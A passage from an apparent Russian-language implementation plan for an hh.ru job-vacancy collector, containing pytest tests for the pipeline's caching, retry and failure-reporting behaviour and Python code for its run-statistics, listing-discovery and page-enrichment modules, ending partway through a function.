    assert (stats.discovered, stats.new_count, stats.rejected) == (20, 20, 2)
    assert (stats.enriched, stats.rescored, stats.stuck, stats.reported) == (18, 0, 0, 18)
    assert len(sink.seen) == 18
    assert "135469420" not in sink.seen  # «Программист 1С (стажер/junior)»


@respx.mock
def test_report_carries_the_fields_bought_by_the_page_request(
    config: Config, repo: SqliteRepository
) -> None:
    """Компания, регион, зарплата и дата публикации доезжают до приёмника.

    Листинг их не отдаёт вовсе — за них заплачено запросом к странице
    вакансии, и они обязаны пройти весь путь: разбор → `save_enriched` →
    `unreported()` → приёмник. Тест читает их из того, что получил
    приёмник, то есть уже ПОСЛЕ обратного чтения из базы.
    """
    mock_source(
        listing=listing_html(("111", "Senior Embedded Engineer")),
        page=load("vacancy_salary.html.gz"),
    )
    run(config, repo, [RecordingSink()])
    stored = repo.reported_since(datetime(2026, 7, 1, tzinfo=UTC))
    assert [vacancy.discovered.id for vacancy in stored] == ["111"]
    discovered = stored[0].discovered
    assert (discovered.company, discovered.area) == ("Альтео Софт", "Москва")
    assert (discovered.salary.amount_from, discovered.salary.amount_to) == (100000, 150000)
    assert discovered.published_at == datetime(2026, 7, 27, 16, 27, 20, 492000, tzinfo=UTC)


@respx.mock
def test_rejected_vacancy_is_never_fetched(config: Config, repo: SqliteRepository) -> None:
    """Скачиваются РОВНО выжившие — ни больше, ни меньше.

    Прежняя редакция проверяла только отсутствие одного URL и потому
    проходила даже тогда, когда обогащение не скачивало вообще ничего.
    """
    _, _, page_route = mock_source()
    sink = RecordingSink()
    run(config, repo, [sink])
    requested = sorted(call.request.url.path for call in page_route.calls)
    assert requested == ["/vacancy/111"]
    assert sink.seen == ["111"]


# --- страница качается один раз за жизнь вакансии --------------------------


@respx.mock
def test_second_run_costs_one_request_and_reports_nothing(
    config: Config, repo: SqliteRepository
) -> None:
    """Считаются ФАКТИЧЕСКИЕ запросы, а не результат.

    Второй прогон обязан стоить одного запроса к листингу и ни одного к
    страницам вакансий: описание уже записано, а `pending_enrichment`
    выбирает только `description IS NULL`. Проверка «во втором прогоне
    ничего не отправлено» этого не ловит — она зелена и когда конвейер
    качает всё заново.
    """
    _, listing_route, page_route = mock_source()
    scorer = KeywordScorer(config.profile)
    first = run(config, repo, [RecordingSink()], scorer)
    assert (listing_route.call_count, page_route.call_count) == (1, 1)

    sink = RecordingSink()
    second = run(config, repo, [sink], scorer)
    assert (listing_route.call_count, page_route.call_count) == (2, 1)
    assert (second.new_count, second.reported, second.status) == (0, 0, "ok")
    assert sink.batches == []
    assert first.reported == 1


@respx.mock
def test_pages_of_one_listing_are_requested_one_by_one(
    tmp_path: Path, repo: SqliteRepository
) -> None:
    """`pages: 2` — это два запроса, второй с `?page=1` (нумерация с нуля).

    Без этого теста конвейер, читающий только первую страницу, выглядел бы
    полностью работоспособным: вакансии есть, отчёт есть, статус `ok`.
    """
    config = load_config(write_config(tmp_path))
    _, listing_route, _ = mock_source(listing=TWO_VACANCIES)
    run(config, repo, [RecordingSink()])
    assert [str(call.request.url) for call in listing_route.calls] == [
        LISTING_URL,
        f"{LISTING_URL}?page=1",
    ]


# --- C3: валидатор условного запроса пишется ПОСЛЕ записи вакансий ---------


@respx.mock
def test_unparsable_listing_leaves_no_cache_validator(
    config: Config, repo: SqliteRepository
) -> None:
    """Валидатор снимка, который не был прочитан, — вечный 304.

    Проверяется и то, что новый не записан, и то, что прежний СБРОШЕН:
    иначе одна обрезанная выдача ослепляет сервис навсегда, причём при
    зелёном healthcheck и чистом `docker logs`.
    """
    repo.save_cache_headers(LISTING_URL, '"stale-v0"', None)
    mock_source(
        listing='<html><head><link rel="canonical" href="/vacancies/programmist">'
        "</head><body>без ItemList</body></html>"
    )
    stats = run(config, repo, [RecordingSink()])
    assert repo.cache_headers(LISTING_URL) == {}
    assert stats.status == "failed"


@respx.mock
def test_truncated_listing_does_not_blind_the_next_run(
    config: Config, repo: SqliteRepository
) -> None:
    """Сквозная форма того же дефекта: авария не нужна, хватит одной обрезки.

    Мок отвечает 304 на условный запрос — ровно как hh.ru. Если первый
    прогон сохранит валидатор до разбора, второй получит 304, вакансий не
    увидит никогда и отчитается `ok`.
    """
    broken = '<html><head><link rel="canonical" href="/vacancies/programmist"></head></html>'
    state = {"listing": broken}

    def answer(request: httpx.Request) -> httpx.Response:
        if request.headers.get("If-None-Match"):
            return httpx.Response(304)
        return httpx.Response(200, text=state["listing"], headers={"ETag": '"v1"'})

    respx.get("https://hh.ru/robots.txt").mock(
        return_value=httpx.Response(
            200,
            text=(FIXTURES / "robots_hh.txt").read_text(encoding="utf-8"),
            headers={"Content-Type": "text/plain"},
        )
    )
    respx.get(url__startswith=LISTING_URL).mock(side_effect=answer)
    respx.get(url__regex=PAGE_PATTERN).mock(return_value=httpx.Response(200, text=page_html()))

    first = run(config, repo, [RecordingSink()])
    assert (first.status, first.discovered) == ("failed", 0)

    state["listing"] = TWO_VACANCIES
    sink = RecordingSink()
    second = run(config, repo, [sink])
    assert (second.status, second.discovered, second.reported) == ("ok", 2, 1)
    assert sink.seen == ["111"]


@respx.mock
def test_validator_is_not_stored_when_writing_vacancies_fails(
    config: Config, repo: SqliteRepository, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Сторож самого ПОРЯДКА, а не только сброса кэша.

    Сброс `reset_cache` спасает лишь тот отказ, который мы предвидели —
    отказ разбора. Между разбором и записью в базу может случиться что
    угодно: заблокированная база, кончившееся место, убитый контейнер. Если
    валидатор к этому моменту уже записан, следующий прогон получит 304 и
    не увидит эти вакансии НИКОГДА.
    """
    mock_source(listing_headers={"ETag": '"v1"'})

    def locked(*args: object, **kwargs: object) -> bool:
        raise sqlite3.OperationalError("database is locked")

    monkeypatch.setattr(repo, "add_discovered", locked)
    with pytest.raises(sqlite3.OperationalError):
        run(config, repo, [RecordingSink()])
    assert repo.cache_headers(LISTING_URL) == {}


@respx.mock
def test_validator_is_saved_after_a_good_page(config: Config, repo: SqliteRepository) -> None:
    """Обратная сторона: на успешном разборе валидатор обязан сохраниться,
    иначе условные запросы не работают вовсе и каждый прогон тянет тело."""
    mock_source(listing_headers={"ETag": '"v1"'})
    run(config, repo, [RecordingSink()])
    assert repo.cache_headers(LISTING_URL) == {"If-None-Match": '"v1"'}


# --- R-I3: агрегатный сторож тишины ---------------------------------------


@respx.mock
def test_run_where_no_listing_yielded_anything_is_a_failure(
    config: Config, repo: SqliteRepository, caplog: pytest.LogCaptureFixture
) -> None:
    """Пустая страница законна, пустой ПРОГОН — нет.

    `itemListElement: []` разбирается без ошибки (честно пустая выдача), и
    без агрегатного сторожа прогон отчитался бы `ok` при нулевой работе —
    класс «месяцы молчания при зелёном healthcheck».
    """
    mock_source(listing=listing_html())
    with caplog.at_level(logging.ERROR):
        stats = run(config, repo, [RecordingSink()])
    assert (stats.status, stats.discovered) == ("failed", 0)
    assert stats.exit_code() == 1
    assert "ни одна не дала ни одной вакансии" in caplog.text


@respx.mock
def test_one_empty_page_among_several_is_not_a_failure(
    tmp_path: Path, repo: SqliteRepository
) -> None:
    """Сторож обязан быть АГРЕГАТНЫМ: пустая вторая страница — норма для
    листинга, который короче двух страниц."""
    config = load_config(write_config(tmp_path))

    def answer(request: httpx.Request) -> httpx.Response:
        body = listing_html() if request.url.query else TWO_VACANCIES
        return httpx.Response(200, text=body)

    respx.get("https://hh.ru/robots.txt").mock(
        return_value=httpx.Response(
            200,
            text=(FIXTURES / "robots_hh.txt").read_text(encoding="utf-8"),
            headers={"Content-Type": "text/plain"},
        )
    )
    respx.get(url__startswith=LISTING_URL).mock(side_effect=answer)
    respx.get(url__regex=PAGE_PATTERN).mock(return_value=httpx.Response(200, text=page_html()))
    stats = run(config, repo, [RecordingSink()])
    assert (stats.status, stats.discovered, stats.reported) == ("ok", 2, 1)


# --- C4: авария источника не жжёт попытки ---------------------------------


@respx.mock
def test_source_outage_does_not_burn_enrich_attempts(
    config: Config, repo: SqliteRepository
) -> None:
    """Три прогона при лежащем hh.ru — очередь обязана остаться целой.

    `max_attempts = 3`, то есть прежняя редакция плана к третьему прогону
    отправляла всю очередь в `rejected`/`enrich_failed` терминально, и
    вернуть её было нечем: `add_discovered` даёт False, а
    `pending_enrichment` требует `description IS NULL`. 12 часов
    недоступности источника стоили всего бэклога.
    """
    mock_source(page=httpx.Response(503))
    scorer = KeywordScorer(config.profile)
    for _ in range(config.app.enrich.max_attempts):
        stats = run(config, repo, [RecordingSink()], scorer)
        assert (stats.enriched, stats.status) == (0, "partial")
    assert [vacancy.id for vacancy in repo.pending_enrichment(3)] == ["111"]

    respx.get(url__regex=PAGE_PATTERN).mock(return_value=httpx.Response(200, text=page_html()))
    sink = RecordingSink()
    recovered = run(config, repo, [sink], scorer)
    assert (recovered.enriched, recovered.reported) == (1, 1)
    assert sink.seen == ["111"]


@respx.mock
def test_broken_page_burns_attempts_and_ends_in_enrich_failed(config: Config, db_path: str) -> None:
    """Обратная сторона того же разделения: 404 — состояние ВАКАНСИИ.

    Счётчик обязан работать, иначе несуществующая вакансия перепрашивается
    вечно. Терминальный статус ставит тем же UPDATE `bump_enrich_attempt`.
    """
    disk = SqliteRepository(db_path)
    disk.init_schema()
    mock_source(page=httpx.Response(404))
    scorer = KeywordScorer(config.profile)
    for _ in range(config.app.enrich.max_attempts):
        run(config, disk, [RecordingSink()], scorer)
    assert repo_status(db_path, "111") == ("rejected", "enrich_failed", 3)
    assert disk.pending_enrichment(3) == []
    disk.close()


def repo_status(db: str, vacancy_id: str) -> tuple[object, object, object]:
    raw = sqlite3.connect(db)
    row = raw.execute(
        "SELECT status, reject_reason, enrich_attempts FROM vacancy WHERE id = ?", (vacancy_id,)
    ).fetchone()
    raw.close()
    return tuple(row)


# --- I3: отказ оценки не выбрасывает скачанную страницу -------------------


@respx.mock
def test_scoring_failure_keeps_the_page_and_is_loud(
    config: Config, repo: SqliteRepository, caplog: pytest.LogCaptureFixture
) -> None:
    """Скоринг — локальное вычисление; страница за ним уже стоила запроса.

    Проверяется всё, что здесь дорого: прогон не упал, страница скачана
    РОВНО один раз за оба прогона, вакансия ждёт в `pending_scoring`,
    остаток очереди назван в логе поимённо, статус понижен, — и второй
    прогон досчитывает оценку, НЕ обращаясь к hh.ru.

    Прежняя редакция вызывала `scorer.score(...)` прямо аргументом записи,
    поэтому `ZeroDivisionError` (достижимая опечаткой `saturation: 0`)
    роняла прогон целиком и выбрасывала уже скачанную страницу.
    """
    _, _, page_route = mock_source()
    with caplog.at_level(logging.ERROR):
        first = run(config, repo, [RecordingSink()], BrokenScorer(config))
    assert (first.status, first.enriched, first.reported, first.stuck) == ("partial", 0, 0, 1)
    assert page_route.call_count == 1
    assert [vacancy.id for vacancy, _ in repo.pending_scoring()] == ["111"]
    assert "111" in caplog.text

    sink = RecordingSink()
    second = run(config, repo, [sink], KeywordScorer(config.profile))
    assert page_route.call_count == 1
    assert (second.rescored, second.stuck, second.reported) == (1, 0, 1)
    assert sink.seen == ["111"]


@respx.mock
def test_score_is_recomputed_and_sent_within_one_run(
    config: Config, repo: SqliteRepository, db_path: str
) -> None:
    """Порча оценки лечится за ОДИН прогон, а не за два.

    Карантин срабатывает внутри `unreported()`: нечитаемая оценка
    обнуляется в момент чтения, и вакансия уходит в `pending_scoring`
    уже после того, как отправлять было бы поздно. Поэтому пересчёт стоит
    между двумя чтениями — один вызов задерживал бы вылеченную вакансию
    до следующего прогона.
    """
    disk = SqliteRepository(db_path)
    disk.init_schema()
    mock_source()
    scorer = KeywordScorer(config.profile)
    run(config, disk, [RecordingSink()], scorer)
    corrupt(
        db_path,
        "UPDATE vacancy SET status = 'new', reported_at = NULL, score_detail = ? WHERE id = '111'",
        "{не json",
    )

    sink = RecordingSink()
    stats = run(config, disk, [sink], scorer)
    assert (stats.rescored, stats.stuck, stats.reported) == (1, 0, 1)
    assert sink.seen == ["111"]
    disk.close()


# --- I1: частичный отказ приёмника -----------------------------------------


@respx.mock
def test_partial_sink_failure_keeps_everything_unreported(
    config: Config, repo: SqliteRepository, caplog: pytest.LogCaptureFixture
) -> None:
    """Ни одна вакансия не помечается отправленной, и об этом громко.

    Повтор при этом неустраним: живой приёмник получит те же вакансии
    следующим прогоном. Тест фиксирует и это — иначе «защита от потери»
    выглядела бы бесплатной.
    """
    mock_source()
    good = RecordingSink("csv")
    bad = RecordingSink("markdown", fail=True)
    with caplog.at_level(logging.ERROR):
        stats = run(config, repo, [good, bad])
    assert (stats.status, stats.reported) == ("partial", 0)
    assert "markdown" in caplog.text and "повторно" in caplog.text
    assert good.seen == ["111"]
    assert [vacancy.discovered.id for vacancy in repo.unreported()] == ["111"]

    both = RecordingSink("csv")
    second = run(config, repo, [both])
    assert (second.status, second.reported) == ("ok", 1)
    assert both.seen == ["111"]


@respx.mock
def test_run_without_sinks_marks_nothing_reported(config: Config, repo: SqliteRepository) -> None:
    """Пустой список приёмников — не повод пометить вакансии отправленными.

    Через конфиг недостижимо (`sinks` требует непустого списка), но именно
    такие пути в этом проекте обязаны кричать, а не молчать.
    """
    mock_source()
    stats = run(config, repo, [])
    assert (stats.status, stats.reported) == ("failed", 0)
    assert [vacancy.discovered.id for vacancy in repo.unreported()] == ["111"]


# --- журнал прогона --------------------------------------------------------


@respx.mock
def test_forbidden_stops_the_run_and_closes_the_journal(config: Config, db_path: str) -> None:
    """403 останавливает прогон (спека §9), но строку журнала закрывает.

    Незакрытая строка `running` — это не косметика: healthcheck смотрит в
    журнал, и висящие строки копятся вечно.
    """
    disk = SqliteRepository(db_path)
    disk.init_schema()
    respx.get("https://hh.ru/robots.txt").mock(
        return_value=httpx.Response(
            200,
            text=(FIXTURES / "robots_hh.txt").read_text(encoding="utf-8"),
            headers={"Content-Type": "text/plain"},
        )
    )
    respx.get(url__startswith=LISTING_URL).mock(return_value=httpx.Response(403))
    with pytest.raises(AccessForbidden):
        run(config, disk, [RecordingSink()])
    assert disk.last_successful_run() is None
    assert journal(db_path) == [("failed", 0, 0, 0, 0, 0, 0, 0)]
    disk.close()


@respx.mock
def test_counters_survive_a_crash_in_the_middle(
    config: Config, db_path: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Счётчики накапливаются по ходу, а не присваиваются в конце.

    Падение на третьей вакансии из четырёх обязано оставить в журнале
    двойку: с присваиванием после возврата функции там был бы ноль, и
    журнал врал бы о том, сколько страниц уже скачано.
    """
    disk = SqliteRepository(db_path)
    disk.init_schema()
    mock_source(
        listing=listing_html(
            ("111", "Инженер"), ("222", "Разработчик"), ("333", "Программист"), ("444", "Тимлид")
        )
    )
    real = disk.save_enriched
    calls = {"n": 0}

    def flaky(vacancy_id: str, details: VacancyDetails, score: ScoreBreakdown) -> None:
        calls["n"] += 1
        if calls["n"] == 3:
            raise TypeError("база сломалась посреди прогона")
        real(vacancy_id, details, score)

    monkeypatch.setattr(disk, "save_enriched", flaky)
    with pytest.raises(TypeError):
        run(config, disk, [RecordingSink()])
    assert journal(db_path) == [("failed", 4, 4, 0, 2, 0, 0, 0)]
    disk.close()


def test_counter_names_match_the_run_table_whitelist() -> None:
    """Имя счётчика — не строка, которую можно опечатать.

    `finish_run` отбрасывает неизвестные имена МОЛЧА, поэтому опечатка в
    `RunCounters` стоила бы потерянного счётчика без единого признака.
    """
    assert set(RunCounters.__annotations__) <= ALLOWED_RUN_COUNTERS


def test_naive_moment_is_rejected(config: Config, repo: SqliteRepository) -> None:
    """Имя файла отчёта берётся из `now`, а `reported_at` пишется в UTC.

    Наивная дата при ночном прогоне разводит их на сутки, и найти отчёт
    по дате из базы становится невозможно.
    """
    with make_client(config) as client, pytest.raises(ValueError, match="aware UTC"):
        run_once(
            config, client, repo, KeywordScorer(config.profile), [], datetime(2026, 7, 28, 10, 0)
        )


# --- сторожа дрейфа источника ---------------------------------------------


@respx.mock
def test_salary_drift_guard_is_wired_into_enrichment(
    config: Config, repo: SqliteRepository, caplog: pytest.LogCaptureFixture
) -> None:
    """`SalaryBlockStats` обязан получать каждую страницу прогона.

    Не передать его в `parse_vacancy_page` — значит выключить сторож
    переименованного атрибута `data-qa="vacancy-salary"`, оставив его в
    коде. Проверяется на страницах без блока зарплаты.
    """
    mock_source()
    with caplog.at_level(logging.WARNING):
        run(config, repo, [RecordingSink()])
    assert 'data-qa="vacancy-salary"' in caplog.text


@respx.mock
def test_more_than_half_failed_pages_raise_the_canary(
    config: Config, repo: SqliteRepository, caplog: pytest.LogCaptureFixture
) -> None:
    """Канарейка на смену вёрстки (спека §9): страница без JSON-LD.

    Причина отказа здесь — сама страница, поэтому в логе обязана быть
    вёрстка, а не недоступность источника: лечит их разный человек.
    """
    mock_source(page="<html>без всякого JSON-LD</html>")
    with caplog.at_level(logging.ERROR):
        stats = run(config, repo, [RecordingSink()])
    assert stats.status == "partial"
    assert "сменил вёрстку" in caplog.text
```

- [ ] **Step 3: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_pipeline.py -q`
Expected: `ModuleNotFoundError: No module named 'hh_search.pipeline'`, «1 error»

- [ ] **Step 4: Реализовать `hh_search/pipeline/stats.py`**

```python
"""Счётчики прогона и его статус.

Статус умеет только УХУДШАТЬСЯ. Причина практическая: шагов, способных
частично отказать, четыре, и каждый писал бы своё значение — последний
затирал бы предыдущие, а `ok` после `partial` означал бы прогон, который
потерял работу и об этом не сказал. Отсюда `degrade()` вместо присваивания
и порядок `ok < partial < failed`.

`partial` считается успехом для `last_successful_run()` (значит и для
healthcheck), поэтому им обозначается только частичная потеря работы. Всё,
что означает «прогон не состоялся» или «работа не делается вовсе», обязано
быть `failed` — иначе получается тот самый зелёный healthcheck при
месяцах молчания.
"""

from typing import TypedDict

from pydantic import BaseModel

OK = "ok"
PARTIAL = "partial"
FAILED = "failed"

_RANK = {OK: 0, PARTIAL: 1, FAILED: 2}

# Коды возврата CLI. `partial` отличается от `failed` не строгостью, а
# содержанием: прогон состоялся, но часть работы потеряна. Cron и
# `docker run` видят ненулевой код в обоих случаях, а человек по коду
# различает два разных разбора. 2 не занят намеренно: его отдаёт click на
# ошибку в аргументах, и там же CLI отдаёт его на ошибку конфига.
EXIT_CODES = {OK: 0, FAILED: 1, PARTIAL: 3}


class RunCounters(TypedDict):
    """Поля таблицы `run`, которые заполняет конвейер.

    Именно TypedDict, а не `dict[str, int | str | None]`: `finish_run`
    принимает счётчики через `**counters`, и словарь с размытым типом
    значений mypy обязан сверять с КАЖДЫМ именованным параметром, включая
    `finished_at: datetime | None`, — три ошибки типа на пустом месте. У
    TypedDict набор ключей известен, поэтому проверка идёт по именам, а
    имя счётчика перестаёт быть строкой, которую можно опечатать
    (`ALLOWED_RUN_COUNTERS` неизвестные имена отбрасывает молча — тест
    сверяет один список с другим).
    """

    discovered: int
    new_count: int
    rejected: int
    enriched: int
    rescored: int
    stuck: int
    reported: int
    error: str | None


class RunStats(BaseModel):
    """То, что уезжает в таблицу `run` и в код возврата CLI."""

    discovered: int = 0
    new_count: int = 0
    rejected: int = 0
    enriched: int = 0
    rescored: int = 0
    stuck: int = 0
    reported: int = 0
    status: str = OK
    error: str | None = None

    def degrade(self, status: str, reason: str) -> None:
        """Ухудшить статус прогона и запомнить причину.

        Улучшить статус этим методом нельзя: `ok` после `partial` — это
        потеря, о которой прогон промолчал. Причина сохраняется от самого
        плохого статуса; при равном статусе побеждает первая, потому что
        она обычно и есть корень, а последующие — следствия.
        """
        if _RANK[status] > _RANK[self.status]:
            self.status = status
            self.error = reason
        elif self.error is None:
            self.error = reason

    def counters(self) -> RunCounters:
        """Счётчики для `finish_run`. `status` и `finished_at` — не здесь.

        `status` уезжает отдельным параметром, а `finished_at` конвейер не
        передаёт вовсе: время закрытия ставит хранилище.
        """
        return {
            "discovered": self.discovered,
            "new_count": self.new_count,
            "rejected": self.rejected,
            "enriched": self.enriched,
            "rescored": self.rescored,
            "stuck": self.stuck,
            "reported": self.reported,
            "error": self.error,
        }

    def exit_code(self) -> int:
        return EXIT_CODES[self.status]
```

- [ ] **Step 5: Реализовать `hh_search/pipeline/discovery.py`**

```python
"""Шаги 1–3: листинги, дедупликация, префильтр (спека §4.1).

Порядок записи внутри шага 1 — не стилистический. Валидатор условного
запроса (`ETag`/`Last-Modified`) сохраняется ПОСЛЕ того, как все вакансии
страницы оказались в базе, и никогда раньше. Обратный порядок означал, что
любой отказ между этими точками оставляет в `http_cache` валидатор
снимка, который никогда не был прочитан: дальше `If-None-Match` даёт 304,
страница не разбирается вообще, и прогон честно сообщает `ok` при нулевой
работе. Для воспроизведения не нужна авария — достаточно, чтобы hh.ru
один раз отдал обрезанную выдачу. Это класс отказа «месяцы молчания при
зелёном healthcheck», и стоит он всех вакансий сразу.
"""

import logging

import httpx

from hh_search.config.models import Config, QuerySpec
from hh_search.errors import FetchFailed, RobotsDisallowed
from hh_search.filtering.prefilter import Prefilter
from hh_search.pipeline.stats import FAILED, PARTIAL, RunStats
from hh_search.sources.http import PoliteClient
from hh_search.sources.listing import build_listing_url, parse_listing
from hh_search.storage.repository import SqliteRepository

logger = logging.getLogger(__name__)

NOT_MODIFIED = 304


def discover(config: Config, client: PoliteClient, repo: SqliteRepository, stats: RunStats) -> None:
    """Обойти все листинги и все их страницы; каждая страница — один запрос."""
    fetched = 0
    unchanged = 0
    for query in config.queries.queries:
        for page in range(query.pages):
            url = build_listing_url(query, page)
            try:
                response = client.get(url, conditional=repo.cache_headers(url))
            except (FetchFailed, RobotsDisallowed) as error:
                # Состояние СЕРВЕРА, а не листинга: следующий прогон
                # повторит запрос, терять нечего. Спека §9 — WARNING+partial.
                stats.degrade(PARTIAL, f"листинг {url} не получен: {error}")
                logger.warning("листинг %s пропущен: %s", url, error)
                continue
            if response.status_code == NOT_MODIFIED:
                unchanged += 1
                logger.debug("листинг %s не изменился", url)
                continue
            if response.status_code != 200:
                stats.degrade(PARTIAL, f"листинг {url}: код {response.status_code}")
                logger.warning("листинг %s ответил %s", url, response.status_code)
                continue
            # Считается ОТДАННАЯ источником страница, а не успешно
            # разобранная: дрейф формата, при котором не разбирается ни
            # одна, — это и есть тишина, которую обязан поймать сторож
            # ниже. Считай мы разобранные, отказ разбора остался бы
            # `partial`, то есть успехом для healthcheck.
            fetched += 1
            _store_page(repo, query, url, response, stats)
    _check_not_silent(config, stats, fetched, unchanged)


def _store_page(
    repo: SqliteRepository,
    query: QuerySpec,
    url: str,
    response: httpx.Response,
    stats: RunStats,
) -> None:
    """Разобрать страницу, записать вакансии и только потом — валидатор."""
    try:
        vacancies = parse_listing(response.text, query.slug)
    except FetchFailed as error:
        # Валидатор не сохраняем и вычищаем прежний: 304 на следующем
        # прогоне спрятал бы дрейф формата за нулевой работой, а один
        # лишний полный ответ — дешевле месяца молчания.
        repo.reset_cache(url)
        stats.degrade(PARTIAL, f"листинг {url} не разобран: {error}")
        logger.error("листинг %s не разобран, кэш условного запроса сброшен: %s", url, error)
        return
    for vacancy in vacancies:
        stats.discovered += 1
        if repo.add_discovered(vacancy, query.cluster, query.weight):
            stats.new_count += 1
    repo.save_cache_headers(
        url, response.headers.get("ETag"), response.headers.get("Last-Modified")
    )


def _check_not_silent(config: Config, stats: RunStats, fetched: int, unchanged: int) -> None:
    """Агрегатный сторож: пустая страница законна, пустой ПРОГОН — нет.

    Пустой `itemListElement` — законный результат для ОДНОЙ страницы
    (короткий листинг, конец пагинации), поэтому `parse_listing` на нём
    молчит. Для всего прогона при непустом списке листингов он означает,
    что источник перестал отдавать выдачу, — и это ровно тот класс
    отказа, который стоил проекту раунда: месяцы тишины при зелёном
    healthcheck.

    `failed`, а не `partial`, потому что `partial` считается успехом для
    `last_successful_run()`, то есть для healthcheck. Сторож накрывает и
    дрейф формата: там отказывает разбор каждой страницы, и без этой
    строки прогон остался бы `partial`, то есть успешным.
    """
    if fetched and not stats.discovered:
        stats.degrade(
            FAILED, f"источник отдал {fetched} страниц листингов, вакансий не найдено ни одной"
        )
        logger.error(
            "источник отдал %d страниц листингов по %d запросам, и ни одна не дала ни "
            "одной вакансии. Либо блок ItemList пуст, либо разбор отказал на каждой "
            "странице (причина выше). Прогон помечен %s",
            fetched,
            len(config.queries.queries),
            FAILED,
        )
    elif unchanged and not fetched:
        logger.warning(
            "ни одна из %d страниц листингов не изменилась с прошлого прогона (304); "
            "новых вакансий в этом прогоне не будет",
            unchanged,
        )


def prefilter(config: Config, repo: SqliteRepository, stats: RunStats) -> None:
    """Шаг 3: отсев по заголовку — единственный барьер перед сетью.

    Идёт по всей очереди обогащения, а не только по найденному сейчас:
    отсев локальный и бесплатный, а правка `negative` в конфиге обязана
    доставать накопленный бэклог, а не только следующую находку.
    """
    barrier = Prefilter(config.profile)
    for vacancy in repo.pending_enrichment(config.app.enrich.max_attempts):
        reason = barrier.reason_to_reject(vacancy)
        if reason is not None:
            repo.mark_rejected(vacancy.id, reason)
            stats.rejected += 1
```

- [ ] **Step 6: Реализовать `hh_search/pipeline/enrichment.py`**

```python
"""Шаги 4–6: страница вакансии, оценка и локальный пересчёт (спека §4.1).

Единственный шаг конвейера, ходящий в сеть за вакансией, и потому
единственный, где ошибка стоит запроса к hh.ru. Отсюда два разделения,
без которых шаг теряет данные.

1. **Транспортный отказ ≠ отказ страницы.** `FetchFailed` от 503 или
   таймаута и `RobotsDisallowed` от временно недоступного robots.txt — это
   состояния СЕРВЕРА, а не вакансии. Жечь ими `enrich_attempts` значит
   терять всю очередь за одну аварию источника: при `interval_hours = 4` и
   `max_attempts = 3` двенадцати часов недоступности достаточно, чтобы вся
   очередь ушла в `rejected`/`enrich_failed` терминально, откуда её не
   возвращает ничто (`add_discovered` даёт False, `pending_enrichment`
   требует `description IS NULL`). Спека §9 для этой строки требует лишь
   `WARNING` и `partial`. Счётчик уместен там, где отказ про саму вакансию:
   404, отсутствие `JobPosting`, пустое `description`.
   Плата за это решение названа честно: при длительной аварии вакансия
   перепрашивается каждый прогон. Дешевле её сделать `next_attempt_at` с
   экспоненциальным backoff, но это колонка в схеме, то есть правка
   задачи 6, и заказывать её надо явно. Терять данные ради экономии
   запросов — не тот размен, который выбирала спека.
2. **Отказ оценки ≠ отказ страницы.** Скоринг — чисто локальное
   вычисление, а страница за спиной уже стоила запроса. Поэтому
   исключение из `scorer.score` сохраняет страницу через
   `save_description` и оставляет вакансию в `pending_scoring`: в сеть за
   ней больше не пойдёт никто (спека §5.2).
"""

import logging

from hh_search.config.models import Config
from hh_search.domain.models import DiscoveredVacancy, VacancyDetails
from hh_search.errors import FetchFailed, RobotsDisallowed
from hh_search.pipeline.stats import PARTIAL, RunStats
from hh_search.scoring.base import Scorer
from hh_search.sources.http import PoliteClient
from hh_search.sources.vacancy_page import SalaryBlockStats, parse_vacancy_page, vacancy_url
from hh_search.storage.repository import SqliteRepository

logger = logging.getLogger(__name__)


def enrich(
    config: Config,
    client: PoliteClient,
    repo: SqliteRepository,
    scorer: Scorer,
    stats: RunStats,
) -> None:
    """Скачать страницы очереди обогащения, оценить и сохранить."""
    pending = repo.pending_enrichment(config.app.enrich.max_attempts)
    salary_stats = SalaryBlockStats()
    unavailable = 0
    unreadable = 0
    for vacancy in pending:
        # URL собирается заново, а не берётся из базы: канонический
        # `https://hh.ru/vacancy/{id}` без query-строки — единственная
        # форма, разрешённая живым robots.txt (см. sources/listing.py).
        url = vacancy_url(vacancy.id)
        try:
            response = client.get(url)
        except (FetchFailed, RobotsDisallowed) as error:
            # Источник, а не вакансия: попытку НЕ жжём.
            unavailable += 1
            stats.degrade(PARTIAL, f"страница {url} не получена: {error}")
            logger.warning("страница %s недоступна, попытка не израсходована: %s", url, error)
            continue
        if response.status_code != 200:
            _burn_attempt(config, repo, stats, vacancy.id, f"код {response.status_code}")
            unreadable += 1
            continue
        try:
            details = parse_vacancy_page(response.text, salary_stats)
        except FetchFailed as error:
            _burn_attempt(config, repo, stats, vacancy.id, str(error))
            unreadable += 1
            continue
        if _save(repo, scorer, vacancy, details, stats):
            # Накапливаем по ходу, а не присваиваем в конце: падение на
            # шестнадцатой из двадцати обязано оставить в журнале
            # пятнадцать, а не ноль.
            stats.enriched += 1
    salary_stats.log_summary()
    _canary(len(pending), unavailable, unreadable)


def _burn_attempt(
    config: Config, repo: SqliteRepository, stats: RunStats, vacancy_id: str, reason: str
) -> None:
    """Отказ про саму вакансию: инкремент попытки и, при исчерпании, отказ.

    Терминальный статус ставит тем же UPDATE сам `bump_enrich_attempt` —
    отдельного `mark_rejected` здесь нет сознательно: пара вызовов
    оставляла между собой состояние, невидимое всем трём выборкам
    (спека §5.2).
    """
    attempts = repo.bump_enrich_attempt(vacancy_id, config.app.enrich.max_attempts)
    stats.degrade(PARTIAL, f"вакансия {vacancy_id} не обогащена: {reason}")
    if attempts >= config.app.enrich.max_attempts:
        logger.warning(
            "вакансия %s: попытка %d из %d, лимит исчерпан, отказ enrich_failed: %s",
            vacancy_id,
            attempts,
            config.app.enrich.max_attempts,
            reason,
        )
    else:
        logger.warning(
            "вакансия %s: попытка %d из %d не удалась: %s",
            vacancy_id,
            attempts,
            config.app.enrich.max_attempts,
            reason,
        )


def _save(
    repo: SqliteRepository,
    scorer: Scorer,
    vacancy: DiscoveredVacancy,
    details: VacancyDetails,
    stats: RunStats,
) -> bool:
    """Оценить и записать. Отказ оценки не выбрасывает скачанную страницу."""
    try:
        score = scorer.score(vacancy, details)
    except Exception as error:  # noqa: BLE001 — страница дороже оценки
        repo.save_description(vacancy.id, details)
        stats.degrade(PARTIAL, f"оценка вакансии {vacancy.id} не посчиталась: {error}")
        logger.error(
            "оценка вакансии %s не посчиталась (%s); страница сохранена без оценки и "
            "будет досчитана локально, в сеть за ней больше не идём",
            vacancy.id,
            error,
            exc_info=True,
        )
        return False
    try:
        repo.save_enriched(vacancy.id, details, score)
    except ValueError as error:
